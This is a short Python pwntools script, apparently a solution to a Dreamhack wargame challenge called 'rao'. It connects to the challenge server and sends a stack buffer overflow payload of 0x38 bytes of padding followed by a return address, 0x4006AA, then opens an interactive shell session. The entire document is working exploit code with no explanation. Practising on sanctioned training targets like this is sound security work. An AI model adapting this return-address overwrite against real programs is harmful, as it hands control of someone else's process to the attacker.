from pwn import *
# r = process('./rao')
r = remote("host2.dreamhack.games", 17157)
tmp = r.recvuntil("Input:")
print(tmp)
p = b"A" * 0x30 + b"A" * 0x8 + p64(0x4006AA)
r.sendline(p)
r.interactive()
